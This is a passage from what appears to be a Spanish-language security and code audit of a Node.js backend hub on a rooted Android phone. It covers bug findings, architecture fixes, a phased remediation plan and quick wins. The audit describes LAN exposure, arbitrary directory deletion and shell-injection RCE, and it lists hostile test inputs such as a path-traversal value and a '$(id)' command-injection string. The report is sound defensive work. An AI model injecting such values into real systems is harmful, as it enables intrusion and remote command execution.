// server.js:914-921 — ambas ramas idénticas
if (!provId) {
  if (sid.startsWith("agy_") || ...) { provId = "antigravity"; }
  else { provId = "antigravity"; }            // rama else muerta
}
// server.js:988-990
if (!body.model) { body.model = "gemini-3.8-flash-high"; }
// providers.js:564-571 — string sin "/" ⇒ providerID "opencode" con modelID gemini
let providerID = "opencode"; ... finalPayload.model = { modelID, providerID };
```
Resultado: una sesión OpenCode sin header `X-Provider` se ejecuta en la CLI de Antigravity, y si acaba en OpenCode, el daemon recibe un modelo con `providerID: "opencode"` inválido → 400.

### 🟠 C8 — Peticiones colgadas en rutas modulares (BUG-07/08) *(ALTO)*
```js
// projectRoutes.js:27-33 — sin try/catch
const state = manager.getProjectState(id);   // getProjectAbsPath lanza p.ej. "Agencia de Marketing" (espacio)
// pathResolver.js:16
return /^[a-zA-Z0-9\-_]+$/.test(projectId); // proyectos reales NO cumplen (projects.json:5 name "Agencia de Marketing", id=nombre de carpeta en scanWorkspace)
// projectRoutes.js:50 — sin await, writeHead ya emitido
manager.indexProject(id, res);
```
El `GET …/state` lanza y nadie responde → la conexión espera 135 s (`server.requestTimeout`, 2520); el `POST …/index` deja el SSE abierto para siempre si `invoke` rechaza.

### 🟠 C9 — Escrituras que se saltan la capa atómica (BUG-09/10/11/12) *(ALTO)*
Contradicen `BACKEND_ARCHITECTURE §3` ("TODAS las operaciones se serializan… escritura atómica"):
- `server.js:1807` — `saveProjectsStore(store)` en `summarize` **sin mutex**.
- `server.js:750-754` — `providers.json` con `writeFileSync` plano **y** perdiendo `description`/`enabled` (regenerado desde `listProviders()`), mientras `ProviderManager.saveConfig` (providers.js:1530) hace lo correcto y **no se usa**.
- `server.js:57` — `ui-state.json` con `writeFileSync` plano.
- `server.js:1604` — `await adapter.createSession()` (red/CLI hasta 8 s) **dentro del mutex global** → bloqueo sistémico de `projects.json`.

### 🟠 C10 — `loadProjectsStore` inexistente silenciada (BUG-14) *(ALTO)*
```js
// providers.js:906-918
try {
  const store = loadProjectsStore();   // ← ReferenceError: no existe en providers.js (grep: solo la línea de la llamada)
  for (const p of store.projects) { ... fs.rmSync(cDir, ...) ... }
} catch (_) {}                          // ← error tragado: la purga por agyConversationId nunca corre
```
Verificado con grep: `loadProjectsStore` está definida únicamente en `server.js:67`. El `try/catch` vacío convierte un bug de integración en una fuga silenciosa de directorios brain.

### 🟡 C11 — Poll huérfano y respuesta fantasma (BUG-13) *(ALTA)*
```js
// providers.js:608-624 (dentro de res 'end')
const pollTimer = setInterval(async () => {
  if (Date.now() - startTime > 45000) {
    clearInterval(pollTimer);
    return resolve(normalizeMessage({ role: "assistant", text: "" }, sessionId)); // vacío con SENT
  }
  ...
}, 1000);
// providers.js:645-652 — abort llega con resolved=true y NO limpia pollTimer
```
Cliente desconectado ⇒ 45 s de `GET /message` por segundo; timeout ⇒ el UI marca como éxito una respuesta vacía.

### 🟡 C12 — El loop de keepalive puede matar un serve sano (OPS-02) *(MEDIA)*
```sh
# keepalive.sh:66 — decide salud por banner del body
curl -m 2 -s "http://$OC_HOST:$1/" | grep -qi "opencode" || relanzar…
# keepalive.sh:126 — patrón obsoleto: el directorio real es Aegis, no opencode-companion
_hubpids=$(timeout 5 pgrep -f "node.*opencode-companion/server.js" ...)
```
Un 404/502 intermitente o un cambio de banner → kill -9 del serve y relanzamiento; el hub stale por el contrario **no** se detecta por el patrón viejo.

---

## 4. MEJORAS DE ARQUITECTURA

1. **Completar el Strangler Fig (prioridad máxima para deuda):**
   - Extraer `normalizeMessage`, `FileMutex`, `atomic*` a `src/core/` **una sola vez**; que `providers.js` sea un *barrel* que re-exporte (hoy hay duplicación total con imports circulares `../../providers.js`).
   - Montar los 4 routers faltantes y arreglar el contrato de retorno `true`/`undefined` de todos los handlers antes de añadir más rutas.
   - Objetivo medible: `server.js` < 800 líneas (solo bootstrap + proxy).

2. **Capa de seguridad transversal (middleware único):**
   `auth(token)` → `rateLimit(ip)` → `validate(schema)` → `handler` → `errorEnvelope`. Hoy cada ruta reimplementa `try/catch + JSON.parse`; la validación de input existe solo en `validateProjectPayload`.

3. **API versionada y contrato único:**
   - Prefijo `/api/v1`, envelope de éxito/error ÚNICO (`{ok:false,error,code}` en todos lados; eliminar los `{error}` crudos), `X-Request-Id` propagado a los logs.
   - Generar OpenAPI desde las rutas y test de contrato automático (el `FRONTEND_CONTRACT.md` 1.2.0 ya miente respecto a la implementación: array crudo vs envelope, `project_id`, `202 queued`, `POST /api/opencode/sessions`).

4. **Persistencia:**
   - Regla: *si no pasa por `fileMutex` + `atomicWriteFileSync`, no escribe* (auditar las 4 excepciones actuales).
   - Migrar `projects.json` a **SQLite (WAL)** o, como mínimo, cachear parseo en memoria con invalidación — hoy se re-parsea en cada request bajo polling de 1,5 s.
   - Mover stores críticos fuera de `/sdcard` (FUSE) donde la atomicidad estángañada (DATA-02).

5. **Observabilidad real:**
   - Adoptar `src/core/logger.js` con NDJSON + niveles + `requestId`; suscribirlo al `eventBus` (hoy 0 suscriptores) y exponer contadores (`/api/metrics`) para el Control Center.
   - Registrar jobs reales en `jobScheduler.start()` y montar `jobRoutes` — sin eso, la pantalla de "jobs" es ficción.

6. **Operación:**
   - Healthcheck ligero separado del diagnóstico pesado; rotación de logs; keepalive por healthcheck JSON y detección de proceso por puerto; lock de instancia con `mkdir`.

7. **Testing (de 0 a algo):**
   - Suite mínima imprescindible: (a) tests de contrato por endpoint del FRONTEND_CONTRACT, (b) tests de seguridad: traversal (`..%2F`), inyección (`$(id)`), auth 401, (c) tests de atomicidad (escrituras concurrentes sobre el store).

---

## 5. PLAN DE REMEDIACIÓN PRIORIZADO

### Fase 0 — Inmediato (0-2 días, antes de cualquier uso en red)
1. **SEC-01:** cambiar bind a `127.0.0.1` (server.js:2522) y añadir token obligatorio para `/api/device/*` (incluso en localhost, por el CORS `*`).
2. **SEC-02:** validación de `sid` + verificación de prefijo antes de `rmSync` (providers.js:920).
3. **SEC-03/SEC-04:** eliminar `sh -c` con interpolación en `SkillManager` y en las 6 rutas de dispositivo/asistente (arrays `spawn` + allowlists).
4. **SEC-06:** `opencode serve --hostname 127.0.0.1` en server.js:1333, keepalive.sh:117 y start-hub.sh:16.
5. Quitar CORS `*` (server.js:485).

### Fase 1 — Semana 1 (corrección de bugs bloqueantes)
6. **BUG-01:** `send/json` devuelven `true`; revisar los 6 handlers modulares.
7. **BUG-02/03:** 404 JSON para `/api/*` desconocidas + montar los 4 routers.
8. **BUG-07/08:** try/catch + `await` + `res.end()` en projectRoutes.
9. **BUG-05/06:** ruteo de proveedor y default de modelo por adapter.
10. **BUG-14:** eliminar `loadProjectsStore` fantasma de providers.js (inyectar dependencia).
11. **BUG-09/10/11/12:** todas las escrituras por `fileMutex` + `atomicWriteFileSync`; `createSession` fuera del lock; restaurar `saveConfig`.

### Fase 2 — Semanas 2-3 (contrato y arquitectura)
12. **ARQ-01:** terminar extracción `normalizer.js`/barrel, borrar duplicados de `src/adapters` y arreglar `ClaudeCodeAdapter` (BUG-04).
13. **API-01/02/03/04:** refrescar FRONTEND_CONTRACT a v1.3 con la realidad, versionado `/api/v1`, envelope de error único, timeouts a 90 s, aceptar `project_id`.
14. **TEST-01:** suite vitest + tests de contrato y de seguridad (traversal/injection) en CI.
15. **BUG-13:** poll con limpieza en abort y `status:ERROR` en timeout.

### Fase 3 — Semanas 4-6 (calidad de plataforma)
16. **DATA-01/02:** caché o SQLite + stores fuera de `/sdcard`.
17. **OBS-01/02 + ARQ-04/05:** logger estructurado, suscriptores al eventBus, jobs reales, métricas para Control Center.
18. **OPS-01…06:** keepalive con patrones correctos y sonda JSON, rotación de logs, shutdown completo.
19. **ARQ-02/03:** extraer rutas de dispositivo/asistente a módulos; consolidar fuentes de verdad de proyectos; reconciliar `isValidProjectId` con nombres reales con espacios.

---

## 6. QUICK WINS (esfuerzo mínimo, impacto alto)

| # | Acción | Archivo:Línea | Impacto |
|---|---|---|---|
| 1 | `server.listen(HUB_PORT, "127.0.0.1")` | server.js:2522 | Corta de raíz toda la exposición LAN (1 línea). |
| 2 | Validar `sid` con `/^[A-Za-z0-9_-]+$/` en DELETE/PATCH de sesiones | server.js:834, 837 | Elimina el borrado arbitrario de directorios. |
| 3 | `spawn("npm", ["install","-g", skillId])` + regex de skillId | SkillManager.js:33,49 | Elimina RCE por skills (2 líneas). |
| 4 | `delete parsed.model` en vez de default `gemini-3.8-flash-high` cuando no viene modelo | server.js:988-990 | Arregla 400s del daemon OpenCode. |
| 5 | Borrar la rama `else { provId = "antigravity" }` y respetar `sessionEntry.provider` | server.js:914-921 | Sesiones OpenCode dejan de ir a Antigravity. |
| 6 | `return true;` en los 6 handlers modulares + `json()` con `return true` | skillsRoutes.js:11; projectRoutes.js; server.js:484-488 | Elimina cientos de `ERR_HTTP_HEADERS_SENT` por día. |
| 7 | 404 JSON si `pathname.startsWith("/api")` antes del fallback SPA | server.js:2495 | Los clientes dejan de recibir HTML donde esperan JSON. |
| 8 | Importar y montar `agentRoutes/jobRoutes/workflowRoutes/contentRoutes` | server.js:20-21, 734 | Control Center pasa de ficción a funcional (con BUG-01 arreglado). |
| 9 | `await manager.indexProject(...)` + `finally res.end()` + try/catch en `GET …/state` | projectRoutes.js:27-33, 50 | Elimina peticiones colgadas de 135 s. |
| 10 | Reemplazar escrituras planas por `atomicWriteFileSync` y `saveConfig` | server.js:57, 750, 1807 | Sin corrupción de stores por crash. |
| 11 | Sonda de keepalive por `/global/health` y pgrep con `Aegis/backend/server.js` | keepalive.sh:66, 126 | Evita matar el serve sano y detecta el hub stale. |
| 12 | Añadir `POST /api/opencode/sessions` a la condición de creación | server.js:762 | Cumple el contrato §3.3 con 1 token. |

---

## 7. CONCLUSIÓN

El backend muestra dos personalidades enfrentadas: por un lado, decisiones maduras (mutex por archivo, tmp+fsync+rename, propiedad de sesión no destructiva, manejo de timeout en el proxy, normalización estricta de mensajes); por otro, un perímetro de seguridad inexistente para un proceso **root** en Android y una segunda arquitectura modular que en realidad está mayoritariamente desconectada, duplicada y rota (imports circulares, `normalizer.js` inexistente, routers sin montar, jobs sin arrancar, cero suscriptores de eventos, cero tests).

**Recomendación de release:** *NO-GO* para cualquier escenario que implique estar en la misma red que el teléfono hasta completar la Fase 0. Tras la Fase 0-1 (estimada en ~1 semana de un desarrollador), el riesgo remanente cae a niveles aceptables para una herramienta personal con autenticación básica.

*Auditoría realizada con las metodologías de: Backend Architect, Code Reviewer, AppSec Engineer (OWASP Top 10/ASVS), API Tester (OWASP API Security Top 10) y Database Optimizer.*
